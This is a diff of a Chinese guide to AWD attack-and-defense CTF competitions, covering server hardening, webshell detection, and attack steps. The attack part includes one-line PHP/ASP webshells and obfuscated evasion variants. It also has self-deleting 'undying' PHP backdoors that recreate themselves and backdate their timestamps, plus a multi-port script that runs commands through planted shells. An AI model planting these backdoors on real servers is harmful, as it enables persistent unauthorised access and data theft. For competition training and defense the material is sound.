@@ -27,6 +27,7 @@ AWD赛制是一种网络安全竞赛的赛制。将真实服务器设施和渗�
 - 自由攻击环节：安全加固时间过后，开始自由攻击环节，通过对别的队伍的靶机服务器进行攻击（弱口令/Web漏洞/系统漏洞等）获得Flag进行加分，对应队伍失分
 
 
+
 ## 1# 比赛环境
 
 通常比赛环境有以下三种情况：
@@ -36,11 +37,12 @@ AWD赛制是一种网络安全竞赛的赛制。将真实服务器设施和渗�
 - 纯Windows靶机情况：运维机器 `Windows 10` + Win靶机 `Windows Server 2003/2008/2012` 或者 `Windows 7`
 
 
-## 2# 防守准备（Defense）
+
+## 2# 安全加固环节（Defense）
 
 ### 2.0# 基本加固流程
 
-#### 2.0.1# Windows加固流程
+#### 2.0.1 Windows加固流程
 
 先备份：Web源码、数据库
 
@@ -57,7 +59,7 @@ AWD赛制是一种网络安全竞赛的赛制。将真实服务器设施和渗�
 11. 修改Web站点管理员访问路径、默认口令、数据库口令
 12. 安装WAF脚本，防护Web站点，禁止其他漏洞
 
-#### 2.0.2# Linux加固流程
+#### 2.0.2 Linux加固流程
 
 先备份：Web源码、数据库
 
@@ -73,7 +75,7 @@ AWD赛制是一种网络安全竞赛的赛制。将真实服务器设施和渗�
 
 在防守的时候，信息搜集也很重要，正所谓“知己知彼，百战不殆”
 
-#### 2.1.1# 明确Linux机器信息
+#### 2.1.1 明确Linux机器信息
 
 ```c
 uname -a                       //系统信息
@@ -86,14 +88,14 @@ find / -type d -perm -002      //可写目录检查
 ifconfig                       //Linux上查看网卡信息
 ```
 
-#### 2.1.2# 明确Windows机器信息
+#### 2.1.2 明确Windows机器信息
 
 ```c
 whoami /all                    //Windows上查看用户详细信息
 ipconfig  /all                 //Windows上查看网卡信息
 ```
 
-#### 2.1.3# 查看开放端口
+#### 2.1.3 查看开放端口
 
 ```c
 netstat                                                       //查看活动连接
@@ -103,7 +105,7 @@ firewall-cmd --zone= public --remove-port=80/tcp –permanent   //关闭端口
 firewall-cmd –reload                                          //防火墙重启
 ```
 
-#### 2.1.4# 默认口令（弱口令）更改
+#### 2.1.4 默认口令（弱口令）更改
 
 为了防范弱口令攻击，Mysql密码默认都是root，phpstudy默认密码123456
 
@@ -117,14 +119,14 @@ set password for mycms@localhost = password('18ciweufhi28746');  //MySQL密码�
 find /var/www//html -path '*config*’                             //查找配置文件中的密码凭证
 ```
 
-#### 2.1.5# 找本地Flag
+#### 2.1.5 找本地Flag
 
 ```c
 grep -r "flag" /var/www/html/  //Linux：在Web目录下查找flag
 findstr /s /i "flag" *.*       //Windows：当前目录以及所有子目录下的所有文件中查找"flag"这个字符串
 ```
 
-#### 2.1.6# 设置禁Ping
+#### 2.1.6 设置禁Ping
 
 ```c
 echo "1" > /proc/sys/net/ipv4/icmp_echo_ignore_all     //临时开启禁ping
@@ -133,7 +135,7 @@ echo "0" > /proc/sys/net/ipv4/icmp_echo_ignore_all     //关闭禁ping
 
 ### 2.2# Web安全加固
 
-#### 2.2.1# 备份源码
+#### 2.2.1 备份源码
 
 防止在对源码进行修改时出问题，或者被攻击方删除源码而准备
 
@@ -167,7 +169,7 @@ scp -r username@servername:remote_dir/ /tmp/local_dir          //从服务器下
 scp -r /tmp/local_dir username@servername:remote_dir           //从本地上传整个目录到服务器
 ```
 
-#### 2.2.2# 设置只读权限
+#### 2.2.2 设置只读权限
 
 对Web文件设置只读权限
 
@@ -189,7 +191,7 @@ chown -R root:root /var/www/html/        //设置拥有人为 root:root 或 http
 chown -R apache:apache /var/www/html/    //确保 apache 拥有 /var/www/html/
 ```
 
-#### 2.2.3# 配置 `.htaccess`
+#### 2.2.3 配置 `.htaccess`
 
 利用 `.htaccess` 配置文件禁止php文件执行
 
@@ -208,7 +210,7 @@ deny from all
 </Directory>
 ```
 
-#### 2.2.4# PHP参数安全配置
+#### 2.2.4 PHP参数安全配置
 
 首先找到PHP的配置文件
 
@@ -243,7 +245,7 @@ sudo systemctl restart php7.0-fpm.service
 
 ### 2.3# 数据库安全加固
 
-#### 2.3.1# Mysql加固
+#### 2.3.1 Mysql加固
 
 为了防范弱口令攻击，Mysql密码默认都是root，phpstudy默认密码123456
 
@@ -271,7 +273,7 @@ mysqldump –all -databases > all.sql
 mysql –u username –p password database < from.sql
 ```
 
-#### 2.3.2# Mssql加固
+#### 2.3.2 Mssql加固
 
 1. 删除不必要的账号	
 2. SQLServer用户口令安全	
@@ -284,7 +286,7 @@ mysql –u username –p password database < from.sql
 
 ### 2.4# 远程控制加固
 
-#### 2.4.1# SSH安全加固
+#### 2.4.1 SSH安全加固
 
 限制IP登录方法
 
@@ -319,7 +321,7 @@ sudo systemctl restart sshd.service
 
 ### 2.5# 应急响应
 
-#### 2.5.1# 查询进程线程
+#### 2.5.1 查询进程线程
 
 ```c
 netstat
@@ -327,14 +329,14 @@ ps -aux
 netstat -apt
 ```
 
-#### 2.5.2# 杀掉进程
+#### 2.5.2 杀掉进程
 
 ```c
 kill -9 pid            //Linux上
 taskkill /f /pid pid   //Windows上
 ```
 
-#### 2.5.3# 搜索WebShell文件
+#### 2.5.3 搜索WebShell文件
 
 ```c
 find /var/www/html -name *.php -mmin -5                        //查看最近5分钟修改文件
@@ -343,7 +345,7 @@ grep -r --include=*.php  '[^a-z]eval($_POST'  /var/www/html    //查包含关键
 find /var/www/html -type f -name "*.php" | xargs grep "eval(" |more //在Linux系统中使用find、grep和xargs命令的组合，用于在指定目录（/var/www/html）下查找所有以.php为扩展名的文件，并搜索这些文件中包含字符串"eval("的行，并使用more命令来分页显示结果以便在输出较长时进行逐页查看
 ```
 
-#### 2.5.4# 查杀不死马
+#### 2.5.4 查杀不死马
 
 也可以利用命令自动进行查找删除
 
@@ -357,7 +359,7 @@ ps -aux | grep www-data | grep -v grep | awk '{print $2}' | xargs kill -9
 service php-fpm restart
 ```
 
-#### 2.5.5# 杀弹反弹shell
+#### 2.5.5 杀弹反弹shell
 
 老规矩查看进程
 
@@ -377,16 +379,309 @@ kill ps -aux | grep www-data | grep apache2 | awk '{print $2}'
 
 
 
-## 3# 攻击准备（Attack）
+## 3# 自由攻击环节（Attack）
 
-### 3.1# 主要准备内容
+### 3.0# 主要准备内容
 
 1. 各类CMS软件包最新版准备
 2. 扫描工具：Nmap、Nessus、Metasploit更新
 2. 漏洞利用脚本Poc、Exp
 
+### 3.1# 基本信息搜集
 
-### 3.2# Linux提权
+#### 3.1.1 主机信息搜集
+
+Nmap
+
+```c
+namp -sn 192.168.0.0/24            //C段存活扫描
+```
+
+httpscan
+
+```c
+httpscan.py 192.168.0.0/24 –t 10   //C段存活扫描
+```
+
+#### 3.1.2 端口扫描
+
+```c
+nmap -sV 192.168.0.2               //扫描主机系统版本
+nmap -sS 192.168.0.2               //扫描主机常用端口
+nmap -sS -p 80,445 192.168.0.2     //扫描主机部分端口
+nmap -sS -p- 192.168.0.2           //扫描主机全部端口
+```
+
+Python脚本
+
+```python
+import requests
+
+for x in range(2,255): 
+    url = "http://192.168.1.{}".format(x) 
+    try: 
+        r = requests.post(url) 
+        print(url) 
+        except: 
+        pass
+```
+
+### 3.2# 外部打点
+
+#### 3.2.0 常见系统漏洞
+
+- MS17-010（永恒之蓝，可看[https://blog.zgsec.cn/archives/172.html](https://blog.zgsec.cn/archives/172.html)）
+- MySQL进行UDF提权（SQL注入或者MySQL弱口令）
+- MsSQL进行系统命令执行（SQL注入或者MsSQL弱口令）
+- SSH弱口令或默认口令
+- PWN（这个要看具体AWD比赛提供的内容了）
+
+#### 3.2.1 中间件漏洞
+
+- IIS（解析漏洞、远程代码执行）
+- Apache（解析漏洞）
+- Nginx（解析漏洞）
+- Jboss（CVE-2017-7504/CVE-2017-12149/CVE-2015-7501）
+- Mysql（弱口令）
+- Tomcat（弱口令Getshell）
+- Weblogic（CVE-2020-2551/CVE-2020-2555/CVE-2020-2883）
+- SpringBoot（未授权访问漏洞和RCE漏洞，具体可看[https://blog.zgsec.cn/archives/129.html](https://blog.zgsec.cn/archives/129.html)）
+
+#### 3.2.2 集成服务环境漏洞
+
+- wampserver
+- xamppserver
+
+#### 3.2.3 CMS漏洞利用
+
+搜集最新版本的CMS，以及对应的漏洞Poc和Exp，这里仅仅列举部分CMS：
+
+- Aspcms
+- Dedecms
+- Dicuz
+- Drupal
+- Empirecms
+- Eshop
+- Finecms
+- Joomla
+- Lamp
+- Metainfo
+- Phpcms
+- Phpwind
+- Qibocms
+- Seacms
+- Semcms
+- ThinkPHP
+- Wolfcms
+- Wordpress
+- Zabbix
+
+备份文件爆破：使用7kbScan等目录扫描工具对Web系统进行爆破
+
+#### 3.2.4 上传WebShell
+
+常见一句话木马
+
+```php
+PHP： <?php @eval($_POST['pass']);?>      <?php eval($_GET['pass']);
+Asp：   <%eval request ("pass")%>
+Aspx：  <%@ Page Language="Jscript"%> <%eval(Request.Item["pass"],"unsafe");%>
+```
+
+get型木马
+
+```php
+<?php eval($_GET['pass']);
+
+#利用方式/shell.php?pass=eval($_POST[1]);
+```
+
+免杀马制作：[https://github.com/AabyssZG/WebShell-Bypass-Guide](https://github.com/AabyssZG/WebShell-Bypass-Guide)
+
+```php
+<?=~$_='$<>/'^'{{{{';@${$_}[_](@${$_}[__]);                            //执行GET传参 ?_=system&__=whoami 来执行whoami命令
+<?=~$_='$<>/'^'{{{{';$___='$+4(/' ^ '{{{{{';@${$_}[_](@${$___}[__]);   //执行GET传参 ?_=assert 和POST传参 __=PHP代码来GetShell
+```
+
+#### 3.2.5 利用WebShell
+
+curl(跟hackbar差不多)
+
+```c
+C:\Users\admin>curl "http://192.168.182.130:8801/include/shell.php" -d "admin_ccmd=system('cat /f*');"
+//向shell.php文件里传入参数并返回结果
+```
+
+Python多端口传参
+
+```python
+#coding=utf-8
+import requests
+
+url_head="http://192.168.182.130"   #网段
+url=""
+shell_addr="/upload/url/shell.php" #木马路径
+passwd="pass"                   #木马密码
+#port="80"
+payload = {passwd: 'System(\'cat /flag\');'}
+# find / -name "flag*"
+
+#清空上次记录
+flag=open("flag.txt","w")
+flag.close()
+flag=open("flag.txt","a")
+
+for i in range(8000,8004):
+    url=url_head+":"+str(i)+shell_addr
+    try:
+        res=requests.post(url,payload)#,timeout=1
+        if res.status_code == requests.codes.ok:
+            result = res.text
+            print (result)
+            flag.write(result+"\n") 
+        else:
+            print ("shell 404")
+    except:
+        print (url+" connect shell fail")
+
+flag.close()
+```
+
+#### 3.2.6 不死马
+
+简单不死马
+
+```php
+<?php
+set_time_limit(0);   //PHP脚本限制了执行时间，set_time_limit(0)设置一个脚本的执行时间为无限长
+ignore_user_abort(1);  //ignore_user_abort如果设置为 TRUE，则忽略与用户的断开,脚本将继续运行。
+unlink(__FILE__);     //删除自身
+
+while(1)
+{
+    file_put_contents('shell.php','<?php @eval($_POST["password"]);?>');  //创建shell.php
+    sleep(0);    //间隔时间
+}
+```
+
+**可以通过不断复写shell.php来达到该木马难以被使用的效果**
+
+```php
+<?php
+set_time_limit(0);   // 取消脚本运行时间的超时上限
+ignore_user_abort(1);  // 后台运行
+
+while(1)
+{
+    file_put_contents('shell.php','11111111');  //创建shell.php
+    sleep(0);
+}
+```
+
+进阶不死马
+
+```php
+<?php
+ignore_user_abort(true);
+set_time_limit(0);
+unlink(__FILE__);
+$file = 'shell.php';
+$code = '<?php if(md5($_POST["passwd"])=="6daf17e539bf44591fad8c81b4a293d7"){@eval($_REQUEST['cmd']);} ?>';
+while (1){
+    file_put_contents($file,$code);
+    system('touch -m -d "2018-12-01 09:10:12" shell2.php');  //修改时间，防止被删
+    usleep(5000);
+}
+?>
+
+//passwd=y0range857
+//POST传参：passwd=y0range857&a=system('ls');
+```
+
+将这个文件上传到服务器，然后进行访问，会在该路径下一直生成一个名字为shell2.php的shell文件
+
+写入shell， yj.php内容
+
+```php
+<?php
+ignore_user_abort(true);
+set_time_limit(0);
+unlink(__FILE__);
+$file = '.login.php';
+$file1 = '/admin/.register.php'; 
+$code = '<?php if(md5($_GET["passwd"])=="6daf17e539bf44591fad8c81b4a293d7"){@eval($_REQUEST["at"]);} ?>';
+while (1){
+    file_put_contents($file,$code);
+    system('touch -m -d "2018-12-01 09:10:12" .login.php');
+    file_put_contents($file1,$code);
+    system('touch -m -d "2018-12-01 09:10:12" /admin/.register.php');
+    usleep(5000);
+}
+?>
+```
+
+浏览器访问yj.php，会生成不死马.login.php /admin/.register.php
+
+### 3.3# 内网渗透
+
+#### 3.3.1 权限维持
+
+1、不死马
+
+```php
+<?php 
+ignore_user_abort(true);  #客户机断开依旧执行
+set_time_limit(0); #函数设置脚本最大执行时间。这里设置为0，即没有时间方面的限制。
+unlink(__FILE__);  #删除文件本身，以起到隐蔽自身的作用。
+$file = '2.php';
+$code = '<?php if(md5($_GET["pass"])=="1a1dc91c907325c69271ddf0c944bc72"){@eval($_POST[a]);} ?>';
+while (1){
+    file_put_contents($file,$code);
+    system('touch -m -d "2018-12-01 09:10:12" .2.php');
+    usleep(5000);
+} 
+?>
+```
+
+2、隐藏的文件读取
+
+```php
+<?php
+header(php'flag:'.file_get_contents('/tmp/flag'));
+```
+
+条件允许的话，将flag信息直接读取并返回到header头中，这样做不易被发现
+
+#### 3.3.2 关键文件检索
+
+组件检索
+
+```c
+find / -name "apaech2.conf"                 //检索Apache主配置文件
+find / -name "nginx.conf"                   //检索Nginx目录
+find / -path "*nginx*" -name nginx*conf     //检索Nginx配置目录
+find / -name "httpd.conf"                   //检索Apache目录
+find / -path "*apache*" -name apache*conf   //检索Apache配置目录
+```
+
+网站首页
+
+```c
+find / -name "index.php"                    //定位网站目录
+find / -name "index.html"                   //定位网站目录
+```
+
+日志文件检索
+
+```c
+/var/log/nginx/                           //默认Nginx日志目录
+/var/log/apache/                          //默认Apache日志目录
+/var/log/apache2/                         //默认Apache日志目录
+/usr/local/tomcat/logs                    //Tomcat日志目录
+tail -f xxx.log                           //实时刷新滚动日志文件
+```
+
+#### 3.3.3 Linux提权
 
 查询系统版本信息命令：
 
@@ -483,7 +778,7 @@ cat /etc/shadow
 
 其他提权姿势：[https://www.freebuf.com/articles/system/244627.html](https://www.freebuf.com/articles/system/244627.html)
 
-### 3.3# Windows提权和漏洞
+#### 3.3.4 Windows提权
 
 这里列举一些Windows的漏洞：
 
@@ -493,289 +788,6 @@ cat /etc/shadow
 - CVE-2019-1405
 - CVE-2019-1322
 - MS17-017（整型溢出漏洞）
-- MS17-010（永恒之蓝，可看[https://blog.zgsec.cn/archives/172.html](https://blog.zgsec.cn/archives/172.html)）
-
-### 3.4# 中间件漏洞
-
-- IIS（解析漏洞、远程代码执行）
-- Apache（解析漏洞）
-- Nginx（解析漏洞）
-- Jboss（CVE-2017-7504/CVE-2017-12149/CVE-2015-7501）
-- Mysql（弱口令）
-- Tomcat（弱口令Getshell）
-- Weblogic（CVE-2020-2551/CVE-2020-2555/CVE-2020-2883）
-- SpringBoot（未授权访问漏洞和RCE漏洞，具体可看[https://blog.zgsec.cn/archives/129.html](https://blog.zgsec.cn/archives/129.html)）
-
-### 3.5# 集成服务环境漏洞
-
-- wampserver
-- xamppserver
-
-### 3.6# CMS列表参考
-
-下载最新版本+每个CMS对应的漏洞poc、exp工具脚本文章，之后汇总
-
-- Aspcms
-- Dedecms
-- Dicuz
-- Drupal
-- Empirecms
-- Eshop
-- Finecms
-- Joomla
-- Lamp
-- Metainfo
-- Phpcms
-- Phpwind
-- Qibocms
-- Seacms
-- Semcms
-- ThinkPHP
-- Wolfcms
-- Wordpress
-- Zabbix
-
-### 3.7# 攻击常用命令
-
-#### 3.7.1# 主机信息搜集
-
-Nmap
-
-```c
-namp -sn 192.168.0.0/24            //C段存活扫描
-```
-
-httpscan
-
-```c
-httpscan.py 192.168.0.0/24 –t 10   //C段存活扫描
-```
-
-#### 3.7.2# 端口扫描
-
-```c
-nmap -sV 192.168.0.2               //扫描主机系统版本
-nmap -sS 192.168.0.2               //扫描主机常用端口
-nmap -sS -p 80,445 192.168.0.2     //扫描主机部分端口
-nmap -sS -p- 192.168.0.2           //扫描主机全部端口
-```
-
-Python脚本
-
-```python
-import requests
-
-for x in range(2,255): 
-    url = "http://192.168.1.{}".format(x) 
-    try: 
-        r = requests.post(url) 
-        print(url) 
-        except: 
-        pass
-```
-
-#### 3.7.3# 关键文件检索
-
-组件检索
-
-```c
-find / -name "apaech2.conf"                 //检索Apache主配置文件
-find / -name "nginx.conf"                   //检索Nginx目录
-find / -path "*nginx*" -name nginx*conf     //检索Nginx配置目录
-find / -name "httpd.conf"                   //检索Apache目录
-find / -path "*apache*" -name apache*conf   //检索Apache配置目录
-```
-
-网站首页
-
-```c
-find / -name "index.php"                    //定位网站目录
-find / -name "index.html"                   //定位网站目录
-```
-
-日志文件检索
-
-```c
-/var/log/nginx/                           //默认Nginx日志目录
-/var/log/apache/                          //默认Apache日志目录
-/var/log/apache2/                         //默认Apache日志目录
-/usr/local/tomcat/logs                    //Tomcat日志目录
-tail -f xxx.log                           //实时刷新滚动日志文件
-```
-
-备份检索：https://github.com/sry309/ihoneyBakFileScan
-
-#### 3.7.4# 上传后门
-
-curl(跟hackbar差不多)
-
-```c
-C:\Users\admin>curl "http://192.168.182.130:8801/include/shell.php" -d "admin_ccmd=system('cat /f*');"
-//向shell.php文件里传入参数并返回结果
-```
-
-Python多端口传参
-
-```python
-#coding=utf-8
-import requests
-
-url_head="http://192.168.182.130"   #网段
-url=""
-shell_addr="/upload/url/shell.php" #木马路径
-passwd="pass"                   #木马密码
-#port="80"
-payload = {passwd: 'System(\'cat /flag\');'}
-# find / -name "flag*"
-
-#清空上次记录
-flag=open("flag.txt","w")
-flag.close()
-flag=open("flag.txt","a")
-
-for i in range(8000,8004):
-    url=url_head+":"+str(i)+shell_addr
-    try:
-        res=requests.post(url,payload)#,timeout=1
-        if res.status_code == requests.codes.ok:
-            result = res.text
-            print (result)
-            flag.write(result+"\n") 
-        else:
-            print ("shell 404")
-    except:
-        print (url+" connect shell fail")
-
-flag.close()
-```
-
-#### 3.7.5# 一句话木马
-
-常见一句话木马
-
-```php
-PHP： <?php @eval($_POST['pass']);?>      <?php eval($_GET['pass']);
-Asp：   <%eval request ("pass")%>
-Aspx：  <%@ Page Language="Jscript"%> <%eval(Request.Item["pass"],"unsafe");%>
-```
-
-get型木马
-
-```php
-<?php eval($_GET['pass']);
-
-#利用方式/shell.php?pass=eval($_POST[1]);
-```
-
-免杀马制作：[https://github.com/AabyssZG/WebShell-Bypass-Guide](https://github.com/AabyssZG/WebShell-Bypass-Guide)
-
-```php
-<?=~$_='$<>/'^'{{{{';@${$_}[_](@${$_}[__]);                            //执行GET传参 ?_=system&__=whoami 来执行whoami命令
-<?=~$_='$<>/'^'{{{{';$___='$+4(/' ^ '{{{{{';@${$_}[_](@${$___}[__]);   //执行GET传参 ?_=assert 和POST传参 __=PHP代码来GetShell
-```
-
-#### 3.7.6# 不死马
-
-简单不死马
-
-```php
-<?php
-set_time_limit(0);   //PHP脚本限制了执行时间，set_time_limit(0)设置一个脚本的执行时间为无限长
-ignore_user_abort(1);  //ignore_user_abort如果设置为 TRUE，则忽略与用户的断开,脚本将继续运行。
-unlink(__FILE__);     //删除自身
-
-while(1)
-{
-    file_put_contents('shell.php','<?php @eval($_POST["password"]);?>');  //创建shell.php
-    sleep(0);    //间隔时间
-}
-```
-
-**可以通过不断复写shell.php来达到该木马难以被使用的效果**
-
-```php
-<?php
-set_time_limit(0);   // 取消脚本运行时间的超时上限
-ignore_user_abort(1);  // 后台运行
-
-while(1)
-{
-    file_put_contents('shell.php','11111111');  //创建shell.php
-    sleep(0);
-}
-```
-
-进阶不死马
-
-```php
-<?php
-ignore_user_abort(true);
-set_time_limit(0);
-unlink(__FILE__);
-$file = 'shell.php';
-$code = '<?php if(md5($_POST["passwd"])=="6daf17e539bf44591fad8c81b4a293d7"){@eval($_REQUEST['cmd']);} ?>';
-while (1){
-    file_put_contents($file,$code);
-    system('touch -m -d "2018-12-01 09:10:12" shell2.php');  //修改时间，防止被删
-    usleep(5000);
-}
-?>
-
-//passwd=y0range857
-//POST传参：passwd=y0range857&a=system('ls');
-```
-
-将这个文件上传到服务器，然后进行访问，会在该路径下一直生成一个名字为shell2.php的shell文件
-
-写入shell， yj.php内容
-
-```php
-<?php
-ignore_user_abort(true);
-set_time_limit(0);
-unlink(__FILE__);
-$file = '.login.php';
-$file1 = '/admin/.register.php'; 
-$code = '<?php if(md5($_GET["passwd"])=="6daf17e539bf44591fad8c81b4a293d7"){@eval($_REQUEST["at"]);} ?>';
-while (1){
-    file_put_contents($file,$code);
-    system('touch -m -d "2018-12-01 09:10:12" .login.php');
-    file_put_contents($file1,$code);
-    system('touch -m -d "2018-12-01 09:10:12" /admin/.register.php');
-    usleep(5000);
-}
-?>
-```
-
-浏览器访问yj.php，会生成不死马.login.php /admin/.register.php
-
-#### 3.7.7# 权限维持
-
-1、不死马
-
-```php
-<?php 
-ignore_user_abort(true);  #客户机断开依旧执行
-set_time_limit(0); #函数设置脚本最大执行时间。这里设置为0，即没有时间方面的限制。
-unlink(__FILE__);  #删除文件本身，以起到隐蔽自身的作用。
-$file = '2.php';
-$code = '<?php if(md5($_GET["pass"])=="1a1dc91c907325c69271ddf0c944bc72"){@eval($_POST[a]);} ?>';
-while (1){
-    file_put_contents($file,$code);
-    system('touch -m -d "2018-12-01 09:10:12" .2.php');
-    usleep(5000);
-} 
-?>
-```
-
-2、隐藏的文件读取
-
-```php
-<?php
-header(php'flag:'.file_get_contents('/tmp/flag'));
-```
-
-条件允许的话，将flag信息直接读取并返回到header头中，这样做不易被发现
 
 
 
@@ -791,7 +803,7 @@ header(php'flag:'.file_get_contents('/tmp/flag'));
 - [https://xz.aliyun.com/t/12687](https://xz.aliyun.com/t/12687)
 
 
-## 🙏 5# 感谢各位师傅
+## 5# 感谢各位师傅🙏
 
 ## Stargazers
 
